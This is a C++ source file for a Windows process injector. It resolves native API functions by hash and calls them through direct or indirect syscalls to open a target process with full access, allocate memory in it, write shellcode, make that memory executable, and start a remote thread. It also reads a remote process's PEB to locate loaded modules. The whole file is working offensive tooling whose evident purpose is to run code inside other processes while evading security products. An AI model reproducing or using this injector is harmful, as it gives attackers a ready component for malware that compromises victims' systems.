#include "injector.hpp"


injectorMethod mainInjector;


    BOOL injectorMethod::closeH(HANDLE toClose) {

        typedef BOOL(WINAPI* CloseHandle_t)(
            HANDLE  hObject
            );
        unsigned char* k = helperHandler.getKernel32();

        wchar_t wK[50];
        size_t convertedChars = 0;

        mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
        PVOID pCloseHandle = syscallHandler.getFunctionAddressByHash(wK, 946915847);
        CloseHandle_t myCloseH = (CloseHandle_t)pCloseHandle;
        myCloseH(toClose);
        return 1;

    }

    HANDLE injectorMethod::process(int process_id) {
        //std::cout << "received int process_id : " << process_id << "\n";
        CLIENT_ID cid = {};
        cid.UniqueProcess = (HANDLE)(UINT_PTR)process_id;
        //std::cout << "cid.unique Process :  " << cid.UniqueProcess;
        cid.UniqueThread = NULL;
        //std::cout << "\ncid.unique Thread :  " << cid.UniqueThread;

        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

        HANDLE hProcess = NULL;

        syscallHandling::SYSCALL_DATA structNtOpenProcess =
            syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1342423128);

        ssnsysNtOpenProcess = structNtOpenProcess.ssn;
        wsysNtOpenProcess = structNtOpenProcess.syscallAddress;
        std::cout << "\n\n\n\n[+] ssn and syscalls address: \n";
        std::cout << "sycalls adress for NtOpenProcess: " << wsysNtOpenProcess << "\n";
        std::cout << "ssn for NtOpenProcess: " << ssnsysNtOpenProcess << "\n";

        NTSTATUS status = sysNtOpenProcess(
            &hProcess,
            PROCESS_ALL_ACCESS,
            &oa,
            cid
        );

        if (status != 0 || hProcess == NULL) {
            //std::cout << "[-] NtOpenProcess failed: " << status << "\n";
            return NULL;
        }

        return hProcess;
    }


    NTSTATUS injectorMethod::wrMem(HANDLE hProcess, LPVOID rBuffer, PVOID shellcode, SIZE_T len_shellcode) {
        //std::cout << "in write Memory func\n\n";



        syscallHandling::SYSCALL_DATA structNtWriteVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 2515773330);
        wsysNtWriteVirtualMemory = structNtWriteVirtualMemory.syscallAddress;
        //std::cout << "syscall adress for NtWriteVirtualMemory: " << wsysNtWriteVirtualMemory << "\n";
        ssnsysNtWriteVirtualMemory = structNtWriteVirtualMemory.ssn;
        //std::cout << "ssn for NtWriteVirtualMemory: " << ssnsysNtWriteVirtualMemory;
        SIZE_T bytesWritten = 0;
        NTSTATUS status = sysNtWriteVirtualMemory(hProcess, rBuffer, shellcode, len_shellcode, &bytesWritten);
        std::cout << "\nstatus after syscall: " << status << "\n";
        std::cout << "bytes written: " << bytesWritten << "\n";
        std::cout << "\nshellcode len: " << len_shellcode << "\n";
        return status;

    }

    NTSTATUS injectorMethod::protectMem(HANDLE proc, LPVOID buff) {


        syscallHandling::SYSCALL_DATA structNtProtectVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 136929992);
        ssnsysNtProtectVirtualMemory = structNtProtectVirtualMemory.ssn;
        wsysNtProtectVirtualMemory = structNtProtectVirtualMemory.syscallAddress;
        //std::cout << "sycalls adress for NtProtectVirtualMemory: " << wsysNtProtectVirtualMemory << "\n";
        //std::cout << "ssn for NtProtectVirtualMemory: " << ssnsysNtProtectVirtualMemory << "\n";


        DWORD oldProtect = 0;
        SIZE_T len_shellcode = shellcode_len;
        NTSTATUS status = sysNtProtectVirtualMemory(proc, &buff, &len_shellcode, PAGE_EXECUTE_READ, &oldProtect);
        //std::cout << "NtProtectVirtualMemory: " << status << " error: " << GetLastError() << "\n";

        return status;

    }

    NTSTATUS injectorMethod::protectMemFlag(HANDLE proc, LPVOID buff, ULONG flag) {


        syscallHandling::SYSCALL_DATA structNtProtectVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 136929992);
        ssnsysNtProtectVirtualMemory = structNtProtectVirtualMemory.ssn;
        wsysNtProtectVirtualMemory = structNtProtectVirtualMemory.syscallAddress;
        //std::cout << "sycalls adress for NtProtectVirtualMemory: " << wsysNtProtectVirtualMemory << "\n";
        //std::cout << "ssn for NtProtectVirtualMemory: " << ssnsysNtProtectVirtualMemory << "\n";


        DWORD oldProtect = 0;
        SIZE_T len_shellcode = shellcode_len;
        NTSTATUS status = sysNtProtectVirtualMemory(proc, &buff, &len_shellcode, flag, &oldProtect);
        //std::cout << "NtProtectVirtualMemory: " << status << " error: " << GetLastError() << "\n";

        return status;

    }
    LPVOID injectorMethod::vAlloc(HANDLE hProcess, PVOID addr, SIZE_T shellcode_len) {

        //std::cout << "in vAlloc";
        syscallHandling::SYSCALL_DATA structNtAllocateVirtualMemory =
            syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1737737036);

        wsysNtAllocateVirtualMemory = structNtAllocateVirtualMemory.syscallAddress;
        //std::cout << "syscall adress for NtAllocateVirtualMemory: " << wsysNtAllocateVirtualMemory << "\n";
        ssnsysNtAllocateVirtualMemory = structNtAllocateVirtualMemory.ssn;
        //std::cout << "ssn for NtAllocateVirtualMemory: " << ssnsysNtAllocateVirtualMemory;

        if (hProcess == (HANDLE)-1) {
            PVOID baseAddr = NULL; // Must be NULL for the kernel to assign an address
            SIZE_T regionSize = shellcode_len;
            NTSTATUS status = sysNtAllocateVirtualMemory(
                hProcess,
                &baseAddr,
                0,
                &regionSize,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_READWRITE
            );
        }


        NTSTATUS status = sysNtAllocateVirtualMemory(
            hProcess,
            &addr,
            0,
            &shellcode_len,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        );
        //std::cout << "returned status from sysNtAllocateVirtualMemory: " << status;

        if (status != 0) {
            //std::cout << "NtAllocateVirtualMemory failed: " << status << std::endl;
            return NULL;
        }
        //std::cout << "returning addr" << addr;
        return addr;

    }
    VOID injectorMethod::vFree(HANDLE hProcess, PVOID address) {
        syscallHandling::SYSCALL_DATA data = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1192929257); // Hash for NtFreeVirtualMemory
        wsysNtFreeVirtualMemory = data.syscallAddress;
        ssnsysNtFreeVirtualMemory = data.ssn;

        SIZE_T size = 0; // Must be 0 when using MEM_RELEASE
        sysNtFreeVirtualMemory(hProcess, address, size, MEM_RELEASE);
    }
    HANDLE injectorMethod::ntThread(HANDLE proc, LPVOID lpStartAddress, LPVOID lpParameter) {


        HANDLE hThread = NULL;


        syscallHandling::SYSCALL_DATA structNtCreateThreadEx = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 3406569776);
        wsysNtCreateThreadEx = structNtCreateThreadEx.syscallAddress;
        ssnsysNtCreateThreadEx = structNtCreateThreadEx.ssn;
        //std::cout << "sycalls adress for NtCreateThreadEx: " << wsysNtCreateThreadEx << "\n";
        //std::cout << "ssn for NtCreateThreadEx: " << ssnsysNtCreateThreadEx << "\n";
        NTSTATUS status = sysNtCreateThreadEx(
            &hThread,               // Thread handle output
            THREAD_ALL_ACCESS,      // 0x1FFFFF (Access Mask)
            NULL,                   // Object Attributes
            proc,                   // Handle to the remote process
            (LPTHREAD_START_ROUTINE)lpStartAddress, // LoadLibraryW address
            lpParameter,            // Pointer to rBuffer (the DLL path string)
            FALSE,                  // CreateSuspended (FALSE = start immediately)
            0,                      // StackZeroBits
            0,                      // SizeOfStackCommit
            0,                      // SizeOfStackReserve
            NULL                    // BytesBuffer
        );
        //std::cout << "\nNtCreateThreadEx status: " << status << "\n";
        //std::cout << "hThread: " << hThread << "\n";

        //NtWaitForSingleObject
        syscallHandling::SYSCALL_DATA structNtWaitForSingleObject = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1282262588);
        wsysNtWaitForSingleObject = structNtWaitForSingleObject.syscallAddress;
        ssnsysNtWaitForSingleObject = structNtWaitForSingleObject.ssn;
        sysNtWaitForSingleObject(hThread, FALSE, NULL);


        return hThread;
    }

    void injectorMethod::waitForSingle(HANDLE addr) {
        syscallHandling::SYSCALL_DATA structNtWaitForSingleObject = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1282262588);
        wsysNtWaitForSingleObject = structNtWaitForSingleObject.syscallAddress;
        ssnsysNtWaitForSingleObject = structNtWaitForSingleObject.ssn;
        sysNtWaitForSingleObject(addr, FALSE, NULL);
    }

    PVOID injectorMethod::findRemoteModule(HANDLE hProcess, const wchar_t* targetDllName) {


        syscallHandling::SYSCALL_DATA structNtQueryInformationProcess = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 3493133410);
        ssnsysNtQueryInfoProcess = structNtQueryInformationProcess.ssn;
        wsysNtQueryInfoProcess = structNtQueryInformationProcess.syscallAddress;

        // 1. Get Remote PEB Address
        PROCESS_BASIC_INFORMATION pbi;
        PROCESSINFOCLASS pic = ProcessBasicInformation;
        ULONG retLen;
        // Call NtQueryInformationProcess (System Class 0)
        if (sysNtQueryInfoProcess(hProcess, pic, &pbi, sizeof(pbi), &retLen) != 0)
            return NULL;

        // 2. Read the remote PEB structure
        PEB remotePeb;



        syscallHandling::SYSCALL_DATA structNtReadVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 3258999523);
        ssnsysNtReadVirtualMemory = structNtReadVirtualMemory.ssn;
        wsysNtReadVirtualMemory = structNtReadVirtualMemory.syscallAddress;

        sysNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &remotePeb, sizeof(PEB), NULL);

        // 3. Read the Ldr Data structure
        PEB_LDR_DATA ldrData;
        sysNtReadVirtualMemory(hProcess, remotePeb.Ldr, &ldrData, sizeof(PEB_LDR_DATA), NULL);

        // 4. Traverse the Module Linked List
        LIST_ENTRY* pListHead = &ldrData.InLoadOrderModuleList;
        LIST_ENTRY* pCurrentNode = ldrData.InLoadOrderModuleList.Flink;

        while (pCurrentNode != pListHead) {
            LDR_DATA_TABLE_ENTRY entry;
            // Read the current module entry from remote memory
            sysNtReadVirtualMemory(hProcess, CONTAINING_RECORD(pCurrentNode, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks), &entry, sizeof(entry), NULL);

            // Read the module name string from remote memory
            wchar_t moduleName[256];
            sysNtReadVirtualMemory(hProcess, entry.BaseDllName.Buffer, moduleName, entry.BaseDllName.Length, NULL);
            moduleName[entry.BaseDllName.Length / sizeof(wchar_t)] = L'\0';

            // Check if it's our target
            if (_wcsicmp(moduleName, targetDllName) == 0) {
                return entry.DllBase;
            }

            pCurrentNode = entry.InLoadOrderLinks.Flink;
        }

        return NULL;
    };


